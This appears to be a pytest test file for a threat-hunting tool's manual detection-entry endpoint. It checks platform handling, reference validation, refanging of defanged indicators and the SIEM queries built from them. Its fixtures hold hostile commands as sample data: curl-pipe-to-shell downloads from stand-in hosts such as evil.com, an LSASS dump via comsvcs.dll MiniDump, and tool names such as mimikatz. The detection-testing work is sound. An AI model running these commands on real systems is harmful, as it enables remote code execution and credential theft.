"""The Manual page posts its entries to /manual_submit: platforms, indicators, references, the Hunt
tab's options, and what reaches the detection."""

import json
from types import SimpleNamespace

import pytest
from fastapi.testclient import TestClient

import shikari.app as web

CHOICES = ["Windows", "Linux", "macOS", "Containers", "ESXi", "IaaS"]
ATTACK = {"T1059.004": ["Linux", "macOS", "Network Devices"], "T1003.001": ["Windows"]}


def _entry(**kw):
    return {"group_desc": "Kettle Spider", "technique": "T1059.004: Unix Shell", "tactics": ["Execution"],
            "procedures": ["curl -s http://x/a.sh | sh", "chmod +x /tmp/.k"], **kw}


@pytest.fixture
def submit(monkeypatch, tmp_path):
    """POST entries (and form fields) to /manual_submit; returns (response, the manual_data the run
    would get). post.calls holds each run's other arguments, post.sweeps the IOC sweeps asked for."""
    runs, calls, sweeps = [], [], []
    monkeypatch.setattr(web, "DRAFTS_DIR", str(tmp_path))
    monkeypatch.setattr(web, "start_progress", lambda name, data: None)
    monkeypatch.setattr(web, "manual_platform_choices", lambda: CHOICES)
    monkeypatch.setattr(web, "attack_platforms_by_technique", lambda bundle: ATTACK)
    monkeypatch.setattr(web, "modified_process_group_wrapper",
                        lambda group, hypothesis, manual_data=None, **kw: (runs.append(manual_data), calls.append(kw)))
    monkeypatch.setattr(web, "_auto_validate", lambda group, excluded=None: calls[-1].update(auto_validated=group))
    from shikari.build import ioc_sweep
    monkeypatch.setattr(ioc_sweep, "write_ioc_sweeps", lambda group, iocs, source, out, **kw: sweeps.append(iocs) or [])
    monkeypatch.setattr(web, "write_progress", lambda name, data: None)
    # shikari.app's only: the run happens here, nothing lands in data/
    monkeypatch.setattr(web, "threading", SimpleNamespace(Thread=lambda target, daemon=None, **kw: SimpleNamespace(
        start=target)))
    client = TestClient(web.app)  # no startup

    def post(entries, **form):
        r = client.post("/manual_submit", data={"group_name": "Kettle Spider", "group_desc": "Kettle Spider",
                                                "technique_entries": json.dumps(entries), **form},
                        headers={"X-Requested-With": "XMLHttpRequest"})
        return r, (runs[-1] if runs else None)
    post.calls, post.sweeps = calls, sweeps
    return post


def _techniques(manual_data):
    return [t for e in manual_data for t in e["techniques"]]


def test_an_entry_without_platforms_takes_the_techniques(submit):
    # Saved before the field existed, or nothing ticked: ATT&CK's platforms, not every platform
    r, data = submit([_entry()])
    assert r.status_code == 200 and r.json()["redirect_url"].startswith("/progress?group_name=")
    (tech,) = _techniques(data)
    assert tech["technique"] == "T1059.004" and tech["name"] == "Unix Shell"
    assert tech["technique_platforms"] == tech["procedure_platforms"] == ATTACK["T1059.004"]
    assert tech["references"] == [] and "References" not in tech["activity_desc"]


def test_the_users_platforms_override_attack(submit):
    _, data = submit([_entry(platforms=["linux", "Windows", "Linux", "Amiga"])])
    (tech,) = _techniques(data)
    # canonical names, once each; one ATT&CK doesn't have is dropped
    assert tech["technique_platforms"] == tech["procedure_platforms"] == ["Linux", "Windows"]


@pytest.mark.parametrize("bad", ["ftp://files.example.com/report.pdf", "javascript:alert(1)", "example.com/report",
                                 "https://exa mple.com/x", "https://"])
def test_a_reference_that_isnt_a_web_link_is_refused(submit, bad):
    r, data = submit([_entry(references=["https://ok.example.com/a", bad])])
    assert r.status_code == 400 and data is None
    assert "http:// or https://" in r.json()["message"] and bad in r.json()["message"]


def test_references_reach_the_saved_detection(submit, tmp_path, monkeypatch):
    refs = ["https://thedfirreport.com/2026/01/kettle/", "http://example.com/wiki/Shell_(computing)"]
    _, data = submit([_entry(references="\n".join(refs + ["  ", refs[0]]))])
    (tech,) = _techniques(data)
    assert tech["references"] == refs
    # The procedures alone are what the platform checks and the AI read
    assert tech["procedure"] == "curl -s http://x/a.sh | sh\nchmod +x /tmp/.k"

    # Written the way a Hunt detection's ATT&CK sources are: links in its description
    from shikari.build import yaml as yaml_writer
    out = tmp_path / "UnixShell_unix.yaml"
    monkeypatch.setattr(yaml_writer, "check_id", lambda ids: "00000000-0000-0000-0000-000000000000")
    yaml_writer.write_yaml(str(out), tech["name"], tech["technique"], tech["activity_desc"], "Splunk",
                           ["Execution"], "Kettle Spider", "index=unix_prod process=\"*chmod*\"")
    import yaml
    description = yaml.safe_load(out.read_text())["description"]
    html = web.markdown_links_to_html(description)
    assert '<a href="https://thedfirreport.com/2026/01/kettle/"' in html
    # brackets are escaped so the link isn't cut short at ")"
    assert '<a href="http://example.com/wiki/Shell_%28computing%29"' in html
    assert "curl -s http://x/a.sh | sh" in description


def test_entries_need_a_technique_and_procedures(submit):
    r, data = submit([_entry(procedures=["  "])])
    assert r.status_code == 400 and data is None
    r, _ = submit([])
    assert r.status_code == 400


def test_the_orchestrator_keeps_an_entrys_own_platforms(monkeypatch):
    # The manual branch looked platforms up in the bundle for every entry, ignoring the user's
    from shikari.build import orchestrator

    seen = []
    monkeypatch.setattr(orchestrator, "compile_query", lambda data, **kw: seen.append(
        (list(data["technique_platforms"]), data.get("procedure"))))
    monkeypatch.setattr(orchestrator, "safe_progress_update", lambda *a, **kw: None)
    for name in ("_report_technique", "_report_detections"):
        monkeypatch.setattr(orchestrator, name, lambda *a, **kw: None)
    entry = web.manual_entry(_entry(platforms=["Linux"]), ATTACK, CHOICES)
    older = {"technique": "T1003.001", "op_guidance": "", "red_tool": "", "detect_guidance": ""}
    orchestrator.process_group("Kettle Spider", manual_data=[{"tactic": "Execution", "techniques": [entry, older]}],
                               dry_run=True)
    assert seen[0] == (["Linux"], entry["procedure"])
    # an entry without its own falls back to the bundle's, and no procedure text carries over
    assert seen[1][0] == ["Windows"] and seen[1][1] == ""


def test_tactics_default_to_the_techniques_own_by_tactic_name():
    from shikari.app import attack_tactics_by_technique

    bundle = {"objects": [
        {"type": "x-mitre-tactic", "x_mitre_shortname": "credential-access", "name": "Credential Access"},
        {"type": "x-mitre-tactic", "x_mitre_shortname": "command-and-control", "name": "Command and Control"},
        {"type": "attack-pattern", "external_references": [{"source_name": "mitre-attack", "external_id": "T9999"}],
         "kill_chain_phases": [{"kill_chain_name": "mitre-attack", "phase_name": "credential-access"},
                               {"kill_chain_name": "mitre-attack", "phase_name": "command-and-control"}]},
        {"type": "attack-pattern", "revoked": True, "external_references": [{"source_name": "mitre-attack", "external_id": "T9998"}],
         "kill_chain_phases": [{"kill_chain_name": "mitre-attack", "phase_name": "credential-access"}]},
    ]}
    tactics = attack_tactics_by_technique(bundle)
    assert tactics["T9999"] == ["Credential Access", "Command and Control"]
    assert "T9998" not in tactics  # revoked: an entry for it is filed under 'Unknown'


# ── Indicators ─────────────────────────────────────────────────────────────

INDICATORS = """rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump
procdump64.exe
C:\\ProgramData\\svc.dll
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater
Rubeus
CreateRemoteThread
e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
185.220.101[.]4
evil[.]com
hxxps://cdn.evil[.]com/x/payload.bin"""


def test_each_indicator_line_is_classified_into_the_hunt_kinds():
    identifiers, atomic = web.manual_indicators(INDICATORS)
    # Commands, file names and paths, and a one-word tool name: matched in the command line
    assert identifiers["cmd"] == ["rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump", "procdump64.exe",
                                  "C:\\ProgramData\\svc.dll", "Rubeus"]
    assert identifiers["reg"] == ["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"]
    # A Windows API name as extract_commands treats it in ATT&CK text: Defender's ActionType
    assert identifiers["api_event"] == ["CreateRemoteThreadApiCall"]
    assert identifiers["network"] == ["185.220.101.4", "evil.com", "cdn.evil.com", "https://cdn.evil.com/x/payload.bin"]
    # No technique query has a hash column: hashes are only swept for
    assert "e3b0c442" not in json.dumps(identifiers)
    assert atomic == {"hash": ["e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"],
                      "ip": ["185.220.101.4"], "domain": ["evil.com", "cdn.evil.com"]}


def test_defanged_indicators_are_refanged():
    identifiers, atomic = web.manual_indicators(["curl -s hxxp://update[.]evil(.)com/a.sh | sh", "bad[dot]example[.]net",
                                                 "10[.]0[.]0[.]5"])
    assert identifiers["cmd"] == ["curl -s http://update.evil.com/a.sh | sh"]
    assert identifiers["network"] == ["bad.example.net", "10.0.0.5"]
    assert atomic["domain"] == ["bad.example.net"] and atomic["ip"] == ["10.0.0.5"]
    # A command keeps its words: only the bracketed forms are undone, not " at "
    identifiers, _ = web.manual_indicators("schtasks /create /tn Updater /tr C:\\x.exe /sc daily at 10")
    assert identifiers == {"cmd": ["schtasks /create /tn Updater /tr C:\\x.exe /sc daily at 10"]}


def test_a_file_name_isnt_taken_for_a_domain():
    identifiers, atomic = web.manual_indicators(["lsass.dmp", "mimikatz.exe", "loader.ps1"])
    assert identifiers == {"cmd": ["lsass.dmp", "mimikatz.exe", "loader.ps1"]} and atomic == {}


def test_indicators_become_the_entrys_op_guidance(submit):
    _, data = submit([_entry(indicators=INDICATORS)])
    (tech,) = _techniques(data)
    assert tech["op_guidance"]["cmd"][1] == "procdump64.exe" and tech["op_guidance"]["network"][1] == "evil.com"
    # The procedures stay the behaviour: the text the platform checks and the AI read
    assert tech["procedure"] == "curl -s http://x/a.sh | sh\nchmod +x /tmp/.k"
    # Hashes, domains and IPs from every entry go into one sweep
    assert submit.sweeps == [{"hash": ["e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"],
                              "ip": ["185.220.101.4"], "domain": ["evil.com", "cdn.evil.com"]}]


def test_an_entry_from_before_indicators_still_submits(submit):
    r, data = submit([_entry()])
    assert r.status_code == 200
    (tech,) = _techniques(data)
    # As before: the procedures as text, which builds no query without AI or the LOL datasets
    assert tech["op_guidance"] == "curl -s http://x/a.sh | sh\nchmod +x /tmp/.k"
    assert tech["iocs"] == {} and submit.sweeps == []


def test_indicators_reach_every_siems_query(capsys):
    # The manual branch to compile_query's preview of what construct_yaml writes, real mappings
    from shikari.build import orchestrator

    ent = {"technique": "T1003.001: LSASS Memory", "tactics": ["Credential Access"], "platforms": ["Windows"],
           "procedures": ["Dumped LSASS with comsvcs"],
           "indicators": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump\nprocdump64.exe\n"
                         "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL\nevil[.]com"}
    entry = web.manual_entry(ent, {"T1003.001": ["Windows"]}, CHOICES)
    orchestrator.process_group("Kettle Spider", manual_data=[{"tactic": "Credential Access", "techniques": [entry]}],
                               dry_run=True)
    out = capsys.readouterr().out
    sections = {}
    for block in out.split("\n  [")[1:]:
        label, _, body = block.partition("]")
        sections.setdefault(label.rsplit(" ", 1)[0], []).append(body)
    kql, spl = "\n".join(sections["MDE"]), "\n".join(sections["Splunk"])
    # A command (its words, in order) and a file name, in KQL and SPL
    assert 'ProcessCommandLine has_all("rundll32.exe", @"C:\\Windows\\System32\\comsvcs.dll", "MiniDump")' in kql
    assert 'ProcessCommandLine has "procdump64.exe"' in kql
    assert 'process_command_line="*procdump64.exe*"' in spl
    assert 'process_command_line="* C:\\\\Windows\\\\System32\\\\comsvcs.dll *"' in spl
    assert 'RegistryKey has @"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL"' in kql
    assert 'RemoteUrl has "evil.com"' in kql
    assert "procdump64" in "\n".join(sections["Elastic"]) and "procdump64" in "\n".join(sections["Google SecOps"])


# ── The Hunt tab's options ─────────────────────────────────────────────────

def test_options_default_to_the_hunt_tabs(submit):
    # Nothing sent (an older page or an API client): what a Hunt does
    submit([_entry()])
    (kw,) = submit.calls
    assert kw["run_correlation"] is True and kw["osint_enhancement"] is True and kw["lol_datasets"] is True
    assert kw["osint_comparison"] is False and kw["genai_mode"] == "semantic"
    assert "use_llm" not in kw and "auto_validated" not in kw


def test_options_are_passed_to_the_run(submit, monkeypatch):
    chosen = []
    monkeypatch.setattr(web, "_apply_ai_provider_choice", lambda p, m=None: chosen.append((p, m)) or "ai_generators")
    monkeypatch.setattr(web, "_hunt_llm_args", lambda session, p, m: {"use_llm": "llm", "llm_config": {"provider": p}})
    submit([_entry()], run_correlation="false", osint_enhancement="false", osint_comparison="true",
           lol_datasets="false", auto_validate="true", ai_provider="anthropic", ai_model="claude-x")
    (kw,) = submit.calls
    assert (kw["run_correlation"], kw["osint_enhancement"], kw["osint_comparison"], kw["lol_datasets"]) == \
        (False, False, True, False)
    assert chosen == [("anthropic", "claude-x")] and kw["genai_mode"] == "ai_generators"
    assert kw["use_llm"] == "llm" and kw["llm_config"] == {"provider": "anthropic"}
    assert kw["auto_validated"] == "Kettle Spider"
